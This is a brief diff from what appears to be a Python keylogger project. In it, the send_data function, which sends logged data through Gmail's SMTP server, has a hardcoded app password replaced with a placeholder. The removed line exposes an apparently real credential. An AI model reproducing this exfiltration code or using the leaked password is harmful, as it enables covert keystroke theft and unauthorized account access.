@@ -44,7 +44,7 @@ def send_data(path_to_keylogger):
 
 
     port = 587
-    password = "jkmm qmfl ouyv bzwu" #This password can be created on your google account. It is called an app password.
+    password = "Password goes here" #This password can be created on your google account. It is called an app password.
 
     server = smtplib.SMTP(smtp_server_gmail, port)
 
